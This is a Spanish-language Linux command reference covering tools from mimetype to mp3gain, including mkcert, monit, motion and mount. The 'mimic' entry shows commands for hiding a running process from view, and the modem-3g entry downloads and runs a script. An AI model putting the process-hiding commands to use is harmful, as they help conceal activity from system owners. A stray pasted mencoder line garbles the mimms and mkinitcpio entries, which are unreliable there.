# mii-tool eth0


mimetype
Determina el tipo de archivo.
$ mimetype -a archivo.md
$ mimetype -M archivo.sh (No verificar por la extension, solo por el contenido del archivo)


mimic
Herramienta de ejecución encubierta. La ejecución encubierta es el arte de ocultar de la vista a un proceso.
$ mimic -e "script.sh"
$ mimic -b -e "./script.sh" (en background)


mimms
Grabación de emisoras.mencoder mf://*.jpg -ovc lavc -o out.avi
$ mimms -t 2 mms://viplagardere.yacast.net/encodereurope2 (2 minutos)


minfo
Herramienta que imprime los parámetros de un sistema de archivos MS-DOS, como el número de sectores, cabezas y cilindros. También imprime una línea de comandos mformat que puede utilizarse para crear un sistema de archivos MS-DOS similar en otro soporte.


minguetty
Programa minimalista que se utiliza para iniciar sesión en consolas
$ mingetty --autologin usuario console (iniciar automáticamente una sesión de login para el usuario especificado)
$ mingetty --login-graphical console (mostrará una interfaz gráfica de login en lugar de la consola estándar)
$ ps aux | grep mingetty (mostrará si hay procesos mingetty corriendo)
1.-
Para crear un archivo de configuración personalizado:
$ echo "console /dev/ttyS0" > ~/.mingettyrc
Y luego ejecutar:
$ mingetty console


miniflux
[libreadline-dev libconfig-dev libssl-dev lua5.2 liblua5.2-dev libevent-dev libjansson-dev libpython-dev make]. Lector RSS instalado en local o en un servidor. Simplemente se descarga la aplicación de <http://miniflux.net/> y, una vez descomprimida, se copia al directorio web (generalmente /var/www). Se accede colocando en la barra de direcciones: http://localhost/miniflux (Por defecto el nombre de usuario y contraseña son admin:admin)
Atajos de teclado:
	gu (Ir a leídas)
	gb (Ir a marcadores)
	gh (Ir al historial)
	gs (Ir a suscripciones)
	gp (Ir a preferencias)
	s (Descargar contenido)
	p (Noticia anterior)
	n (Noticia siguiente)
	m (Marcar como leido)
	v (Abrir la noticia original)
	o (Desplegar la noticia)
	f (Añadir a favoritos)
	h (Ir a página precedente)
	l (Ir a página anterior)
	? (Abrir la ayuda de los atajos de teclado)
	q (Cerrar la ayuda)


mirmon
Comprueba el estado de los espejos de Debian. Visualizarlos en el navegador con la ruta: /var/lib/mirmon/debian-mirror-check.html. El archivo de configuración en /etc/mirmon.conf.
# mirmon -v -get update (Actualizar estado de los mirrors con la maxima información)
# mirmon -v -get url http://ftp.es.debian.org/debian/ (sondear la url de un mirror)


miscfiles
Conjunto de archivos no cruciales para la administración u operación del sistema, pero se han vuelto comunes en varios sistemas a lo largo de los años. Se originaron de varias fuentes y son libremente redistribuibles (consulte el archivo de copyright para obtener más información). Hacen referencia principalmente a temas ingleses como: Lista de códigos de tres letras para algunos de los principales aeropuertos, códigos de área telefónica de América del Norte), códigos postales para estados de EEUU yY provincias canadienses, la constitución de los Estados Unidos de América y la declaración de la independencia de las trece colonias aunque tambien incluyen otros como: tabla de precedencia para operadores en lenguaje C, descripción del conjunto de caracteres ISO Latin-1, códigos de dos letras para idiomas, de ISO 639, códigos telefónicos de países internacionales, coordenadas geográficas de muchas ciudades importantes, algunas abreviaturas comunes utilizadas en la comunicación electrónica, listas de correo GNU, abreviaturas de países y monedas, índice rfc, etc.). Se puede acceder a todo el material con el navegador, a los diccionarios y listados de palabras: file:///usr/share/dict/ y a los documentos: file:///usr/share/doc/miscfiles.


mispipe
[moreutils]. mispipe se comporta como cualquier tuberia de la shell, incluyendo comandos independientes, pero a diferencia de las clásicas tuberias, que sólo devuelven el estado de salida del último comando, mispipe devuelve el estado de salida del primer comando si este falla.
$ mispipe ls "echo "NO""


mjpg-streamer
Streaming de video
$ mjpg_streamer -i "input_uvc.so -y -f 5" -o output_http.so -p 3000 -n -c USER:CONTRASEÑA -b
Opciones:
	-f  frames por segundo
	-y  cambiar formato mjpg por yuv (cuando mjpg da problemas)
	-b  background
	-n  liberar terminal (conjuntamente con -b)
	-c  usuario:contraseña
Y en el navegador:
http://localhost:3000/?action=snapshot  (tomar una foto)
http://localhost:3000/?action=stream    (reproducir video)
Matar el proceso con:
$ kill -9 `pidof mjpg_streamer`


mk-build-deps
Cea un paquete que satisfaga las dependencias de compilación de un paquete.
$ mk-build-deps emacs25 (crea una paquete emacs25-build-deps_25.1+1-4+deb9u1_amd64.deb con todas las dependencias de emacs25)
$ mk-build-deps -i emacs25 (lo instala todo)


mkcert
Generar certificados SSL [protocolo seguro HTTPS] firmados localmente.
$ apt install wget curl libnss3-tools
$ mkcert -install (generar el Certificate of Authority [CA])
$ mkcert -CAROOT (localizar donde se guarda el CA)
$ mkcert localhost (generar el certificado para localhost)
El comando anterior genera en el directorio donde se lanza los archivos localhost.pem y localhost-key.pem. A continuación crear el archivo:
# nano /etc/apache2/conf-available/ssl-params.conf
Con el contenido:
    SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
    SSLProtocol All -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
    SSLHonorCipherOrder On
    # Disable preloading HSTS for now.  You can use the commented out header line that includes
    # the "preload" directive if you understand the implications.
    # Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    Header always set X-Frame-Options DENY
    Header always set X-Content-Type-Options nosniff
    # Requires Apache >= 2.4
    SSLCompression off
    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/stapling-cache(150000)"
    # Requires Apache >= 2.4.11
    SSLSessionTickets Off
A continuación editar y modificar/añadir en el archivo:
# ano /etc/apache2/sites-available/default-ssl.conf
los poarámetros:
    ServerAdmin usuario@localhost
    ServerName localhost
Para redireccionar todo el tráfico http a cifrado SSL [https]
# nano /etc/apache2/sites-available/000-default.conf
Y en el apartado correspondiente descomentamos o modificamos la linea:
    Redirect permanent  "/" "https://localhost/"
Habilitar los módulos de apache necesarios para SSL y el host virtual:
    # a2enmod ssl
    # a2enmod headers
    # a2ensite default-ssl
Comprobar que no existan errores de sintaxis en los archivos:
    # apache2ctl configtest
# systemctl restart apache2 (reiniciar apache2)
Si existen cortafuegos tipo ufw han de reconfigurarse [ufw allow 'Apache Full']. Podemos comprobar si se ha realizado todo el proceso correctamente colocando en la barra del navegador la dirección https://localhost. El certificado creado no está firmado por una de las autoridades de confianza del navegador y es probable que se vea una alguna advertencia al respecto. clicmos en “ADVANCED” y luego en el enlace proporcionado para acceder a su host


mkdir
Crear directorios.
$ mkdir -p A B C (Crea el directorio A en su interior el B y dentro de este el C)
$ mkdir -m=rwx      (Especifica los permisos del directorio que se crea)
$ mkdir -p -m=x /home/ct/videos/res/tot  (creará los nuevos directorios “videos”, “res” i “tot” y dará permisos de ejecución [x]  al usuario ct)
$ mkdir -p ~/docs/{1,2,3} (creará docs en el directorio del usuario y dentro los directorios 1,2 y 3)
$ mkdir -p project/{lib/ext,bin,src,doc/{html,info,pdf},demo/stat/a} (creación de varios directorios y subdirectorios)
$ mkdir uno dos tres (crear directorios “uno”, “dos” y “tres”)
$ mkdir R{1..9} (Crear los directorios del R1 al R9)


mkdosfs
Formatear a sistema de archivos msdos
# mkdosfs -c /dev/fd0


mke2fs
Formatear a sistema de archivos ext2
# mke2fs -c /dev/fd0         (formatea a ext2 el floppy)


mkeot
[eot-utils]. Genera tipografías en formato EOT desde TTF y OTF. Comando necesario para convertir las fuentes en TTF al formato EOT para ser usado con la propiedad font-face de CSS3, formato requerido por Internet Explorer.
$ mkeot neuropol_x_free.ttf > neuropol_x_free.eot


mkfifo
Crear una tuberia que tanto sirve para permitir que la salida de una aplicación sea la entrada de otra como redirección de cualquier dato de salida que pueda ser grabado a disco.
$ mkfifo pipe (crear la tuberia. Lanzando “ls -l pipe” la primera letra que mostrará será una “p” de pipe [tuberia])
$ ifconfig > pipe  (La consola se bloqueará esperando soltar la tuberia)
$ cat pipe  (Ejecutado desde otra terminal pst o tty ejecutará la tuberia)


mkhomedir_helper
Crear directorios de inicio. El valor predeterminado de umask es 0022. El asistente no toca los directorios de inicio si ya existen.
# mkhomedir_helper USER (formas básica que creará el dir /home/USER)


mkfs
Formatear dispositivos a sistemas de archivo ext2,3,4, vfat....
# mkfs -t ext3 /dev/sda4  (Formatea a ext3 la particion indicada)
# mkfs.ext3 /dev/sda7 (otro modo)
# mkfs.ext2 -c /dev/sda1 (a ext3)
# mkfs.ext4 -c /dev/sda2 (a ext4)
# mkfs.msdos -c /dev/fd0  (formatea a msdos)
# mkfs.vfat /dev/sda1 (formatear en fat 32)
# mkfs.vfat -n datos /dev/sdd1 (formatear en fat32 y con etiqueta “datos”)


mkinitcpio
Herramienta de creación de imagenes de arranque del kernel en ArchLinux
# mkinitcpio -L (Ver lista de hooks)
# mkinitcpio -p linux (Cremencoder mf://*.jpg -ovc lavc -o out.avi
a la imagen con el preset seleccionado)
# mkinitcpio -c /etc/mkinitcpio.conf -g /boot/linux.img (crea manualmente la imagen de inicio, especificando el archivo de configuración y el destino)


mkisofs
Crear imágenes de ficheros
$ mkisofs -r -l -o imagen.iso fichero
$ mkisofs /dev/cdrom > cd.iso (crear una imagen iso del cdrom en disco)


mknod
Crear archivos de dispositivos que no se encuentran en el sistema.
# mknod -m 644  /dev/ttyS4 c 4 64 (con permisos 644, crear el dispositivo de carácter [c] ttyS0 e intervalo entre el máximo y el mínimo)
Una vez creado precisa otorgar propietarios:
# chown root:dialout /dev/ttyS4
Otro ejemplo
# mknod -m 640 /dev/loop8 b 7 8 (con permisos 640, especificando que es un dispositivo de bloques [b] e intervalo entre el máximo y el mínimo)
# chown root:disk /dev/loop8 (Otorgar propiedad)


mkntfs
Crear particiones ntfs.
$ mkntfs -L win -F /dev/sdb2 (con etiqueta “win” y forzando)


mkpasswd
Encriptar contraseñas. Si la contraseña no se especifica, la pedirá por pantalla
$ mkpasswd (Uso básico)
$ mkpasswd password (Encripta "passwrd". Si no se especifica "method" [-m] se usa md5 por defecto)
$ mkpasswd -m help (Muestra las opciones de encriptación)
$ mkpasswd -m sha-512 password (Usando sha-512 para la contraseña "password")


mkswap
Crear un espacio de intercambio.
# mkswap /dev/sda5 (Luego añadir la entrada en /etc/fstab: /dev/sda4 none swap sw 0 0)


mktemp
[coreutils]. Crear archivos o directorios temporales.
$ mktemp (Crea un fichero temporal en /tmp)
$ mktemp -d (Crea un directorio en tmp y en su interior un archivo)
$ mktemp --tmpdir=documentos (crea un archivo temporal en el interior del directorio "documentos")


mktorrent
Crear archivos bittorrent.
$ mktorrent -v -p -a http://url.com -o nombre.torrent (mostrar máxima información, con el flag "privado", url del rastreador y especificar nombre del torrent)


mlabel
Poner etiquetas a las particiones y dispositivos vfat
# mlabel -i /dev/sda2 ::vfat


mlcc
Configuración para mlterm. Las opciones susceptibles de modificación son las reflejadas en /usr/share/doc/mlterm/PROTOCOL.gz apartado “Values for each key”
$ mlcc fg_color blue
$ mlcc bg_color red


mlterm
Emulador de terminal para X Window System, que admite varias codificaciones. Verifica la configuración regional y selecciona la codificación adecuada, no es preciso configurar mlterm para mostrar idioma o codificación. Las codificaciones incluidas son: ISO-8859-[1-11,13-16], TCVN5712, VISCII, TIS-620 (same as ISO-8859-11), KOI8-{R,U,T}, CP{1251,1255},  GEORGEAN-PS, EUC-JP, EUC-JISX0213, ISO-2022-JP{,1,2,3}, Shift_JIS, Shift_JISX0213, ISO-2022-KR, EUC-KR, UHC, JOHAB, EUC-CN (aka GB2312), GBK, ISO-2022-CN, Big5, EUC-TW, HZ, UTF-8, y GB18030.
$ mlterm -b blue -f yellow -g 50x10 (Especificando color de fondo [b] color de fuente [f] y medidas)


mmaker
Herramienta para la creación de menús basados en XML
$ mmaker -v OpenBox3 (Mostrando el proceso y sin sobreescribir el menu.xml anterior)
$ mmaker -f OpenBox3 (Sobreescribiendo el menu.xml anterior)
$ mmaker -f  -s KDE,Xfce,XWindow OpenBox3 (Omitiendo los menús de los escritorios especificados)
$ mmaker -f OpenBox3 -s Console (Omitir del menú las aplicaciones que sólo son para consola)


mmv
Cambiar el sufijo del nombre de los archivos.
$ mmv "*.PNG" "#1.png"   (Renombrar todas las extensiones "PNG" a "png", conservándose el nombre que las precede.)
$ mmv ";*.abc" "#1#2.cba" (Renombrar todas las extensiones "PNG" a "png" del directorio actual y sus subdirectorios)
# mmv “/;*.PNG” “#1#2.png” (Renombrar todos los ficheros del sistema)
$ mmv "*.flv.mpg" "#1.mpg" (Renombrar todos los archivos terminados en .flv.mpg a .mpg)


moc
Reproductor de música.
Copiar el archivo de configuración al directorio personal:
	$ cp /usr/share/doc/moc/examples/config.example.gz ~/.moc/
	$ cd ~/.moc/
	$ gzip -d config.example.gz
	$ mv config.example config
El listado de temas
$ ls /usr/share/moc/themes.
	black_theme  darkdot_theme  example_theme  green_theme moca_theme  nightly_theme  red_theme  transparent-background yellow_red_theme
Para hacer definitivo el cambio, el que se escoja se coloca en:
$ nano .moc/config:
	# Theme file. This can be absolute path or relative to
	# /usr/share/moc/themes/ (depends on installation prefix) or ~/.moc/themes/
	Theme                   = moca_theme
$ mocp  (arrancar la aplicación)
Teclas de control:
	 >  (subir volumen 1%)
	 <  (Bajar volumen 1%)
	 ,  (Bajar volumen 5%)
	 .  (Subir volumen 5%)
	 h  (Lista de teclas)
	 T  (Para cambiar el tema. Sólo para la presente sesión)
	 n  (Reproduce siguiente canción)
	 b  (Reproduce la canción anterior)
	 A  (Añade un directorio a la lista de reproducción)
	 a  (Añade solo un archivo a la lista)
	 c  (Quita un archivo de la lista de reproducción)
	 C  (Borra toda la lista)
	 q  (Pasar a segundo plano. Vuelve a primer plano, según la ditro con: ./moc, moc, ./mocp)
	 Q  (Cierra totalmente el programa)
	 l  (Cambia de doble ventana a ventana simple y viceversa)
	 tabulador   (Cambiamos de pantalla, en caso de estar dividida)
	 p o espacio (Pausar)
	 enter       (Play)
	 Crtl + u    (Para entrar una url. Pulsando intro la incluye en playlist)
	 d  (Borrar una url del playlist)
1.-
error "Could not find codec parameters"
En algunas ocasiones (Debian) puede que falte el paquete libav y tenga que lanzarse:
$ mocp -O "PreferredDecoders+=mp3(mp3,ffmpeg)"
Si funciona, colocar la linea en .moc/config:
	PreferredDecoders       += mp3(ffmpeg)
2.-
Una pequeña lista de url musicales (Tambien válidas para vlc u otros reproductores en streaming):
	# Ibiza
	http://s6.viastreaming.net:7010
	# City Dance
	http://streaming.radionomy.com:8000/City-Dance-Radio
	# Dance-Makina
	http://uplink.duplexfx.com:8044
	# Progressive
	http://85.25.86.69:8000/
	# De los 90
	http://91.121.38.216:8018/
	# Hardcore
	http://eilo.org:8000/happycore
	# Punk-Rock
	http://broadcast.rantradio.com:9000
	# Heavy Metal
	http://s5.voscast.com:7346/
	# Black-Metal
	http://radio.hazzardofdarkness.com:6666/ (Black-Metal
	# Rock Alternativo
	http://66.55.148.27:10054
	# Piano Jazz
	http://80.94.69.106:6814/
	# Relax New Age
	http://radio2.trancemission.fm:80/
	# Hip-Hop
	http://sc4.spacialnet.com:26368/
	# Italiana
	http://italia.lolliradio.net:8010/
	# Beattles
	http://uplink.duplexfx.com:8062/
	# Pop
	http://listen.radionomy.com/lonestar-radio
	# Rock-Pop, britpop
	http://listen.radionomy.com/walesfm
3.-
Moc también puede ser usado en modo servidor lo que nos permite liberar la terminal.
	$ mocp -S  (Lanza el modo servidor)
	$ mocp -p  (Reproduce el playlist)
	$ mocp -f  (Avanza al suguiente track del playlist)
	$ mocp -r  (Retrocede al anterior track del playlist)
	$ mocp -s  (Para la reproducción)
	$ mocp -P  (Pausa la reproducción)
	$ mocp -x  (Mata el servidor)


modem-3g
Instalación de modems inalámbricos:
# apt-get install usb-modeswitch
$ wget http://www.sakis3g.org/versions/latest/i386/sakis3g.gz
$ gzip -d sakis3g.gz
$ chmod +x sakis3g
$ ./sakis3g --interface


modinfo
Información sobre módulos.
$ modinfo sr_mod


module-assistant
Paquete especifico de Debian para la instalación de controladores.
# m-a (abre la interficie ncuses del programa)
# m-a a-i paquete (seleccionar un módulo)
# m-a list (ver lista de paquetes disponibles)


modulos
Comandos relacionados con el manejo de los módulos del kernel
# ls -R /lib/modules/$(uname -r) (Lista todos los modulos disponibles)
# modinfo /ruta_al_modulo/modulo.ko  (Muestra la información de un módulo)
# insmod modulo.ko  (instalar un modulo sin resolver dependencias)
# modprobe modulo.ko  (instalar un modulo incluyendo dependencias)
# depmod -a  (Generar la base de datos de dependencias de los modulos)
# insmod --force modulo.ko (Fuerza la instalación de un módulo)
# modprobe -n -v modulo.ko (Muestra los modulos y sus dependencias)
# lsmod  (Muestra todos los modulos del kernel)
# rmmod modulo.ko  (Elimina un modulo)


mogrify
[imagemagick]. Cambiar formato y redimensionar imágenes de directorios. Se sobreescriben las imágenes.
$ mogrify -format jpg *.png   (Cambiar el formato de varias  imágenes)
$ mogrify -format png -sample 20%x20% *.jpg   (Reducir varias imágenes)
$ mogrify -format png  -thumbnail 10% *jpg (Cambiar formato y crear miniaturas)
$ mogrify -resize 50% *.jpg (reducir todas las imágenes al 50%)
$ mogrify -strip imagen.jpg (eliminar metadatos de una imagen)
$ mogrify -geometry 120x120 *.jpg  (Crear miniaturas)
$ mogrify -quality 60 *.jpg  (Reducir la calidad)
$ mogrify --auto-orient * (Reorientar todo el directorio)
$ mogrify -resize 800 *.jpg (modificar todos los jpg de la carpeta y reducirlos manteniendo la relación a 800 pixels)
$ mogrify -comment "comentario para introducir" salida.jpg (Entrar un comentario en los metadatos)
$ mogrify -label "Texto de la etiqueta" input.jpg (Entrar una etiqueta)
$ mogrify -comment @firma.txt input (Entrar un comentario a partir de un archivo firma.txt)


moggsplit
divide un flujo Ogg multiplexado en archivos separados. Por ejemplo, puede separar un OGM en flujos separados Ogg DivX y Ogg Vorbis, o un archivo  Ogg Vorbis encadenado en dos archivos separados.
$ moggsplit file.ogg


mokutil
Herramienta para importar o borrar las claves de propietario de máquina (MOK) almacenadas en la base de datos de shim. shim es un sencillo paquete de software diseñado para funcionar como cargador de arranque de primera etapa en sistemas UEFI. Una parte clave del diseño de shim es permitir a los usuarios controlar sus propios sistemas. La clave distro CA está integrada en el propio binario shim, pero también hay una base de datos adicional de claves que puede ser gestionada por el usuario, la llamada Machine Owner Key [MOK] Clave del Propietario de la Máquina. El usuario puede añadir y eliminar claves de la lista MOK, de forma totalmente independiente a la clave CA de la distro. La utilidad mokutil puede usarse para ayudar a gestionar las claves aquí desde la zona de usuario de Linux, pero los cambios en las claves MOK sólo pueden confirmarse directamente desde la consola en el momento del arranque. Esto elimina el riesgo de que el malware de la zona del usuario pueda registrar nuevas claves y, por tanto, eludir todo el punto de Secure Boot.
        $ mokutil --sb-state
        SecureBoot disabled
        Platform is in Setup Mode
$ mokutil --disable-validation
$ mokutil --enable-validation


molly-guard
Evitar paradas o reinicios de servidores desde consola remota. Editar:
# nano /etc/molly-guard/rc
Y descomentar la linea:
ALWAYS_QUERY_HOSTNAME=true
Cuando se intente parar o reiniciar el equipo vía ssh, saldrá una nota pidiendo el nombre de la máquina. Una vez introducida, se ejecutará el shutdown o reboot.


mon
Herramienta para monitorear la disponibilidad de servicios y enviar alertas sobre eventos prescritos o fallas en un entorno servidor-cliente. Los servicios se definen como cualquier cosa probada por un programa de "monitorización", que puede ser algo tan simple como hacer ping a un sistema o tan complejo como analizar los resultados de una transacción a nivel de aplicación. Logs en /var/log/mon/ si está activo el servicio se puede monitorear datos con la dirección http://127.0.0.1:2583/ en el navegador.
# monshow --full
# mon -d -S (en modo debug e iniciar con el planificador detenido)
# mon -s /home/USER (epecificando ruta para monitorear scripts)


monfailures
Programa que enumera los últimos fallos de la aplicación mom [ver].
# monfailures


monit
Monitorizador de procesos en ejecución, servicios, demonios, espacios de disco, PIDs, checksums, archivos....
# monit status (Acceder a los informes)
# monit -t (Comprobar errores de configuración [Control file syntax OK])
# monit -h (Listado de comandos disponibles)
# monit quit (Salir)
# monit start all (Arrancar todos los monitoreos)
# monit sotp ssh (Parar un monitoreo de un servicio)
# monit restart all (Reiniciar todos los monitoreos)
# monit summary (Mostrar resumen)
Configuración:
	# nano /etc/monitrc
Las entradas globales empiezan por “set” y los servicios concretos por “check”
Tiempo de actualización de datos, por defecto:
	set daemon  60
Especificar el archivo de eventos (logs)
	set logfile /var/log/monit.log
Configurar para el envio de notificaciones:
	set mailserver localhost
	set alert usuario@localhost.localdomain
	set mail-format {
	from: monit@$HOST
	subject: $SERVICE $EVENT
	message: $ACTION $SERVICE at $DATE on $HOST: $DESCRIPTION.
	}
	set mailserver mail@mail.com (servidor smtp que envia los correos [localhost para notificación local]).
	set alert user@hots.com  (cuenta donde enviar los mensajes de alerta). Ejemplo para enviar notificaciones a correo gmail (en negrita los datos a modificar):
	set mailserver smtp.gmail.com port 587
	username usuario@gmail.com password Tfer7¿-6j
	using tlsv1
	with timeout 30 seconds
	set alert usuario@gmail.com
	Cambiar usuario y contraseña (por defecto: admin/monit)
	allow usuario:contraseña
Especificar desde donde accederemos. Sólo acceso local [localhost:2812]:
set httpd port 2812 and use address localhost
allow localhost
o si queremos acceso remoto [http://ip_o_host:2812] modificar por:
	set httpd port 2812
         allow localhost
Tambien podemos especificar: ips, rangos, hosts concretos o usuarios para solo lectura:
	allow 192.168.1.14
	allow 192.168.1.1/24
	allow host.com
	allow usuario:contraseña read-only
Modificar el nombre del equipo [tiene que estar en /etc/hosts] y adaptar los porcentajes de consumo de carga del sistema [loadvg] y cpu para que al superar ciertos índices o porcentajes, envie una alerta:
check system tux
    if loadavg (1min) > 4 then alert
    if memory usage > 75% then alert
    if swap usage > 85% then alert
    if cpu usage (user) > 70% then alert
    if cpu usage (system) > 70% then alert
    if cpu usage (wait) > 70% then alert
Configurar el monitoreo de apache (Las rutas a los ficheros pertenecen a una distro arch):
check process apache with pidfile /run/httpd/httpd.pid
    start program = "/etc/rc.d/httpd start" with timeout 60 seconds
    stop program  = "/etc/rc.d/httpd stop"
    if cpu > 80% for 5 cycles then restart
    if totalmem > 1500.0 MB for 5 cycles then restart
    if children > 250 then restart
    if cpu usage > 95% for 3 cycles then restart
    if failed port 80 protocol http then restart
Configurar monitoreo de ssh
check process ssh with pidfile /run/sshd.pid
    start program = "/etc/rc.d/sshd start" with timeout 60 seconds
    stop program  = "/etc/rc.d/sshd stop"
    if cpu > 80% for 5 cycles then restart
    if totalmem > 1500.0 MB for 5 cycles then restart
    if children > 250 then restart
    if cpu usage > 95% for 3 cycles then restart
    if failed port 22 protocol ssh then restart
Chequear determinados puertos:
check host localhost with address localhost
      if failed icmp type echo count 10 with timeout 15 seconds
         then alert
      if failed port 22 proto ssh then alert
      if failed port 25 proto smtp then alert
      if failed port 80 proto http then alert
Monitorear ciertos archivos de configuración [de apache y ssh] para que alerte si modifica el checksum:
    check file httpd.conf with path /etc/httpd/conf/httpd.conf
    if changed checksum then alert
    check file ssh_config with path /etc/ssh/ssh_config
    if changed checksum then alert
Monitorizar directorios para que envie una alerta en caso de modificación:
            check directory sbin with path /sbin
	    if changed timestamp then alert
Monitorizar dispositivos /dev/ [discos duros, usb...] para que avise en caso de sobrepasar determinado espacio en disco o lo desmonte al llegar a cierto porcentaje:
	check device sda5 with path /dev/sda5
	start = “/bin/mount /dev/sda5”
	stop = “/bin/umount /dev/sda5”
	if space usage > 90% then alert
	if space usage > 98% then stop
Si, al pasar algún evento queremos lanzar un script algunos ejemplos para hacerlo son:
1.- Cuando la carga del sistema sobrepasa el indice 5 alertará y si supera el 20 ejecutará el script:
check system dominio.com
    if loadavg (1min) > 5 then alert
    if loadavg (1min) > 20 then exec "/bin/bash /root/script.sh"
2.- Si falla el servidor ftp [puerto 21], al pasar 20 segundos alertará  y ejecutará el script
if failed port 21 protocol ftp with 20 seconds then alert and exec “/ftp/script.sh”


monitorix
Herramienta para monitorizar sistemas y diseñada para controlar la mayor cantidad posible de servicios y recursos. Una vez activado el servicio con::
# service monitorix start
Se accede a los informes con el navegador y la dirección http://localhost:8080/monitorix
Podemois ajustar título y otros parámetros en el archivo /etc/monitorix/monitorix.conf


monshow
[mon]. Mostrar el estado operativo del servidor mon. Están disponibles tanto con la interfaz de línea de comandos como la interfaz web [http://127.0.0.1:2583/].
# monshow --full (solo mostrar los servicios que fallan)


montage
[imagemagick]. Crear una imagen con la unión de varias y modificar imágenes.
$ montage *.png salida.jpg (Con todas las imagenes del directorio)
$ montage -adjoin imagen.png imagen.png resultado.png
$ montage -monochrome entrada.png salida.png (convertir a blanco y negro)
$ montage -title “En el lago” entrada.png salida.png (poner título)
$ montage *.png -mode concatenate -tile 10x all.png (Imagen con todas las imágenes del directorio)
$ montage -geometry +1+1 -tile 2x2 *.png salida.png
$ montage *.png -tile 2x5 -geometry 227x147+1+1 salida.png (Colocará todos los png de la carpeta y los colocará en páginas de 10 con la geometria indicada y con una separación de 1 pixel entre ellos


modprobe
Utilidad que se usa para agregar y quitar módulos del kernel. Los módulos del kernel de Linux tienen .ko como extensión del nombre del módulo.
# modprobe --dry-run --verbose ac97_bus
# modprobe -r pcspkr (excluir cargar módulo emncionado [pitido del pc])
# modprobe -q nombre_modulo (excluir información de error respecto de un nombre_modulo)
# modprobe -c | grep pcspkr (comprobar un módulo concreto)
# lsmod | grep pcspkr (ver si un módulo esta cargado)


more
Pagina el fichero que se especifique
$ cat /etc/apt/sources.list | more (como tuberia)
$ more -5 -d /etc/apt/sources.list  (de cinco en cinco lineas y mostrando teclas de ayuda)
atajos:
	espacio (adelanta una pantalla)
	enter (avanza una linea)
	b (retrocede una pantalla)
	/ (busca la palabra introducida a continuación)
	n (busca la siguiente  concurrencia a buscar)
	q (Salir del programa)


moreutils
Colección cada vez mayor de herramientas Unix. Incluye las siguientes utilidades: chronic [ejecuta un comando silenciosamente a menos que falle], combine [combina las líneas en dos archivos usando operaciones booleanas], errno [busca nombres y descripciones de errno], ifdata [obtiene información de la interfaz de red sin analizar la salida de ifconfig], ifne [ejecuta un programa si la entrada estándar no está vacía], isutf8 [comprueba si un archivo o entrada estándar es utf-8], lckdo [ejecuta un programa con un bloqueo mantenido], mispipe [canaliza dos comandos, devolviendo el estado de salida del primero], paralel [ejecuta varios trabajos a la vez], pee [entrada estándar en T a las tuberías], sponge [absorbe la entrada estándar y escribe en un archivo], ts [entrada estándar de marca de tiempo], vidir [edita un directorio en tu editor de texto], vipe [inserta un editor de texto en una tubería] y zrun [descomprime automáticamente los argumentos del comando]


morse
Codifica un texto a lenguaje morse.
$ morse -s linux es un sistema genial


morsegen
Programa que implementa el estándar internacional del código Morse al convertir letras de texto ASCII en notación de código morse ASCII.
$ morsegen file.txt > morse.txt (convertir a morse el texto del archivo mencionada y guardarlo en morse.txt)


mosaic
El abuelo de los navegadores (1993)
# apt-get install build-essential lesstif2-dev libjpeg62-dev libpng12-dev x11proto-print-dev libxmu-headers libxpm-dev libxmu-dev
$ git clone https://github.com/alandipert/ncsa-mosaic.git
$ cd ncsa-mosaic
	$ make linux
	....
	* Welcome to NCSA Mosaic.
	make[1]: Leaving directory `/home/templix/ncsa-mosaic'
$ cd src
$ ./Mosaic


mosh
Un ssh mejorado.
$ mosh usuario@host
$ mosh -p 5000 usuario@host


most
Visualizar páginas man con colores.
# update-alternatives --config pager
Seleccionar el número que indique para most


motion
Video vigilancia por acceso remoto. La configuración que viene por defecto es  suficiente, aunque siempre puede pulirse. Aquí se tratará solo de los mínimos parámetros a modificar para tener motion funcional en local y en remoto .
Abrir los puertos 8080 y 8081 del router y del firewal (Si no se modifican los por defecto)
En debian y derivados
	# nano /etc/motion/motion.conf
	daemon on    (Permitir actuar como demonio)
	webcam_localhost off   (permitir acceso remoto)
	# nano /etc/default/motion
	start_motion_daemon=yes
	# /etc/init.d/motion start
En arch
	# nano /etc/motion/motion.conf
	daemon on
	webcam_localhost off
	Y, si no se va a usar base de datos, comentar los parámetros del 	apartado mysql:
	#sql_log_image on
	#sql_log_snapshot on
	#sql_log_mpeg off
	#sql_log_timelapse off
	#sql_query insert ....
	# mkdir /var/run/motion  (Crear directorio para el PID)
	No existe el /etc/default/motion
	# /etc/rc.d/motion start
Para acceder a la cámara desde el navegador:
http://ip_o_host:8081
Para acceder a la configuración:
http://ip_o_host:8080
En este caso descomentar/modificar en /etc/motion/motion.conf
control_localhost off    (para acceder a la configuración remotamente)
control_authentication username:password (Pide identificación)
substituir por los datos correctos, por ejemplo:
control_authentication juanito:password


mount
Montaje de particiones
# mount -t ext3      (Lista las particones ext3 montados)
# mount -a       (Monta todo lo que contengan la expresion  "auto" en el /etc/fstab)
# mount -s       (Tolera opciones de montaje medio malas en vez de fallar)
# mount -o loop imagen.iso /directorio     (Montar una iso en un dir)
# mount -t vfat /dev/sdf /media/disk -o force,rw   (Forzar montaje lectura y escritura)
# mount | column -t  (muestra todo lo montado de forma ordenada)
# mount -o remount / (Remontar una partición después de, por ejemplo modificar sus atributos (4ª columna) en el fstab)
# mount -o remount,rw,relatime / (Remontar una partición modificando atributos sólo para la presente sesión)


mountpoint
Comprueba si el directorio o archivo dado se menciona en el archivo /proc/self/mountinfo.
          $ mountpoint /dev/pts
          /dev/pts is a mountpoint


mp3blaster
Reproductor de música.
Atajos
	F1 (Añadir ficheros a la lista)
	F3 (Seleccionar todo recursivamente)
	Retroceso (Subir un directorio)
	Espacio (Seleccionar archivo)
	U (Deseleccionar todo)
	D (Eliminar fichero)
	< / > (Bajar / bajar volumen)
	q (Salir del programa)
	? (Mostrar ayuda)
	Enter (Entrar)
	Inicio	(Ir al principio de la lista)
	Fin (Ir al final de la lista)
	4 (Canción anterior)
	5 (Reproducir/Pausar canción)
	6 (Canción siguiente)
	1 (Retroceder canción)
	2 (Detener canción)
	3 (Avanzar canción)


mp3check
Utilidad para la detección de mp3 incompletos o con errores.
$ mp3check 3 -e -r . (sólo los mp3 del presente directorio de forma recursiva y verificar la coherencia y encabezados e imprimir los mensajes de error)


mp3gain
Analiza y ajusta archivos MP3 para que tengan el mismo nivel de volumen.
$ mp3gain -r -k *.mp3 (Normaliza todos los archivos  del directorio)
